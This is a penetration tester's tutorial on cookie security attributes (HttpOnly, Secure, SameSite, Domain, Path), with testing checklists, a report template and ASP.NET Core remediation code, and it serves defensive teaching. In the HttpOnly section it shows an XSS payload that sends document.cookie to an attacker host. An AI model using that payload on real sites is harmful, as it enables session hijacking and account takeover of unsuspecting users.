# Cookie Security — Enterprise Penetration Testing Field Notes

> **Author:** Dheeraj Kumar Jayaswal — Senior Penetration Tester | 6+ Years Enterprise AppSec
>
> **Category:** Identification and Authentication Failures — OWASP A07:2021
>
> **Severity:** Low to High — missing cookie attributes directly enable session hijacking and CSRF
>
> **Real-world impact:** Cookie security attributes are simple to implement and simple to miss. In six years of enterprise testing, I have found missing `HttpOnly` flags that enable XSS-to-ATO chains, missing `Secure` flags transmitting session tokens over HTTP, and missing `SameSite` attributes enabling CSRF on every state-changing endpoint. These are configuration issues that take minutes to fix and that developers consistently overlook because the application works correctly without them.

---

## 📖 The Five Cookie Security Attributes

### Attribute 1 — HttpOnly

**What it does:** Prevents JavaScript from reading the cookie value. `document.cookie` returns an empty string for HttpOnly cookies.

```
Set-Cookie: session=eyJhbG...; HttpOnly    ← JS cannot read this
Set-Cookie: session=eyJhbG...             ← JS can read: document.cookie → exposes token

Impact of missing HttpOnly:
  XSS payload can steal session token:
  document.location = 'https://attacker.com/steal?c=' + document.cookie
  → Session hijack via XSS = Account Takeover

  Without HttpOnly: XSS + session cookie = complete ATO
  With HttpOnly: XSS impact is limited (cannot steal session directly)

Testing:
  In Burp HTTP History → find POST /login response
  Check Set-Cookie header for HttpOnly keyword
  If missing AND XSS exists anywhere → report as combined critical finding
```

### Attribute 2 — Secure

**What it does:** Cookie is only transmitted over HTTPS connections. Never sent over plain HTTP.

```
Set-Cookie: session=eyJhbG...; Secure    ← HTTPS only
Set-Cookie: session=eyJhbG...           ← sent over HTTP too → interception risk

Impact of missing Secure flag:
  If HTTP version of site accessible → session cookie transmitted in cleartext
  Network attacker (coffee shop Wi-Fi, corporate proxy) can intercept cookie
  → Session hijack without any application vulnerability

Testing:
  Step 1: Check login response for Secure flag in Set-Cookie header
  Step 2: Test if HTTP version of the application is accessible:
          http://target.company.com/login  → redirects to HTTPS immediately?
          If HTTP accessible AND Secure missing → Medium finding
          If HTTP redirects immediately AND HSTS present → Low finding
```

### Attribute 3 — SameSite

**What it does:** Controls whether the browser sends the cookie in cross-origin requests. The primary defence against CSRF.

```
SameSite=Strict  → Cookie never sent in cross-origin requests (best CSRF protection)
SameSite=Lax     → Cookie sent in top-level navigation GET only (good default)
SameSite=None    → Cookie sent in all cross-origin requests (CSRF vulnerable!)
[missing]        → Older browsers default to None — CSRF vulnerable

Set-Cookie: session=eyJhbG...; SameSite=Strict; Secure  ← most secure
Set-Cookie: session=eyJhbG...; SameSite=None; Secure    ← CSRF enabled by design!
Set-Cookie: session=eyJhbG...                            ← CSRF possible

When SameSite=None or missing:
→ Cross-origin requests (from attacker's site) include the session cookie
→ CSRF attacks are viable without any token bypass needed
→ See CSRF write-up for full exploitation methodology

Testing:
  Find Set-Cookie in login response
  Identify SameSite attribute value
  If None or missing → document for CSRF testing section
```

### Attribute 4 — Domain Scope

**What it does:** Specifies which domains can receive the cookie. Overly broad domain scope creates security risks.

```
Set-Cookie: session=eyJhbG...; Domain=.company.com   ← ALL subdomains receive this
Set-Cookie: session=eyJhbG...; Domain=app.company.com ← only app.company.com

Risk of broad domain scope:
  If any subdomain (support.company.com, blog.company.com) is compromised
  → That subdomain can read or set the session cookie
  → Subdomain XSS can steal production session cookies

  If a subdomain is abandoned and taken over by attacker:
  → Attacker's subdomain receives the production session cookie on every request

Testing:
  In Set-Cookie: note the Domain value
  If Domain=.company.com → probe all subdomains for XSS or takeover
  Company.com wildcard is only an issue if ANY subdomain is insecure
```

### Attribute 5 — Path Scope

**What it does:** Restricts cookie transmission to specific URL paths.

```
Set-Cookie: admin_session=abc...; Path=/admin  ← only sent to /admin paths
Set-Cookie: session=abc...; Path=/             ← sent to ALL paths (default, typical)

Testing relevance:
  Admin cookies should ideally have Path=/admin scope
  If admin cookie sent to all paths → any path-level vulnerability can expose admin token
  Usually Low severity configuration note rather than exploitable finding
```

---

## 🔧 Testing Cookie Security Systematically

```
Step 1: Login to the application — capture the response in Burp Suite
Step 2: Find Set-Cookie header(s) in the login response
Step 3: Check each cookie that handles authentication for:

Cookie:    session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
Flags:     HttpOnly ✓  Secure ✓  SameSite=Lax ✓  Path=/

Red flags checklist:
  Missing HttpOnly    → JS can read = XSS to ATO chain enabled
  Missing Secure      → Cleartext transmission if HTTP accessible
  SameSite=None       → CSRF attacks viable
  SameSite missing    → CSRF attacks viable (older browsers)
  Domain=.company.com → Broad scope, check subdomains
  Long expiry          → When does the cookie expire? (session vs 365 days)
  Sensitive data in cookie value? → Base64 decode it, check for PII
```

### Cookie Value Analysis

```
Step 1: Copy cookie value from Burp
Step 2: Check if it is Base64:
  Decode: echo "eyJhbGciOi..." | base64 -d
  If it decodes to readable text → inspect for PII, roles, user data

Step 3: Check if it is a JWT:
  3 dot-separated segments starting with eyJ = JWT
  Decode at jwt.io → see header, payload → check claims for sensitive data
  See JWT Attacks write-up for full exploitation methodology

Step 4: Check for predictability:
  Log out → log back in 10 times → collect 10 session cookie values
  Compare: are they random? Sequential? Timestamp-based?
  Predictable tokens = session forging attack possible

Step 5: Check for sensitive data in cookie value:
  Username, email, user ID, role in plaintext = information disclosure
  These are "transparent" cookies — nothing prevents tampering
  Unless HMAC-signed, any data in cookie value is attacker-controlled
```

---

## 📋 Enterprise Pentest Report Template

**Finding Title:** Session Cookie Missing HttpOnly and SameSite Attributes

**Severity:** Medium

```
Login response:
Set-Cookie: session=eyJhbGciOiJIUzI1NiJ9...; Path=/; Expires=Fri, 01 Jan 2027 00:00:00 GMT

Missing: HttpOnly, Secure, SameSite

Impact:
- Missing HttpOnly: Any XSS vulnerability can steal the session token via document.cookie
- Missing SameSite: Session cookie is sent in cross-site requests — CSRF attacks viable
  on all POST endpoints (see separate CSRF finding)
- 2-year expiry: Persistent session enables long-term account compromise via stolen token
```

**Remediation (ASP.NET Core):**
```csharp
// In Program.cs
builder.Services.ConfigureApplicationCookie(options =>
{
    options.Cookie.HttpOnly = true;                    // JS cannot read
    options.Cookie.SecurePolicy = CookieSecurePolicy.Always;  // HTTPS only
    options.Cookie.SameSite = SameSiteMode.Strict;    // no cross-origin
    options.Cookie.Name = "__Host-session";            // __Host- prefix = most secure
    options.ExpireTimeSpan = TimeSpan.FromHours(8);   // reasonable session duration
    options.SlidingExpiration = true;
});
```

---

## 🧭 Key Takeaways

**1. HttpOnly + XSS = the most important combination to document.**
When you find XSS anywhere in the application, the first question is: does the session cookie have HttpOnly? Without it, the XSS leads directly to account takeover via cookie theft. With it, the XSS impact is reduced (but not eliminated — actions can still be performed in the victim's session). Document this explicitly in the XSS finding.

**2. SameSite=None is a deliberate CSRF vulnerability declaration.**
When a developer sets `SameSite=None`, they are explicitly telling the browser to send the cookie in all cross-origin requests. This is required for legitimate third-party cookie scenarios (SSO, embedded widgets) but should be the exception, not the default. If you see SameSite=None on a main session cookie, CSRF testing becomes the immediate priority.

**3. Cookie expiry tells you about the security posture more broadly.**
A session cookie with a 2-year expiry suggests the developers prioritised convenience over security. This is a signal to look more carefully at session invalidation — does logout actually invalidate the token server-side? A long-lived cookie that persists after logout is a separate and serious finding.

---

## 🔗 References
- [OWASP Session Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html)
- [MDN — Using HTTP Cookies](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies)
- [SameSite Cookie Explained](https://web.dev/samesite-cookies-explained/)

---
<div align="center">

*Part of [AppSec From The Trenches](README.md) — Real notes from 6+ years of enterprise penetration testing.*

[![LinkedIn](https://img.shields.io/badge/LinkedIn-Dheeraj%20Kumar%20Jayaswal-0077B5?style=flat-square&logo=linkedin&logoColor=white)](https://linkedin.com/in/dheerajkumarjayaswal)

</div>
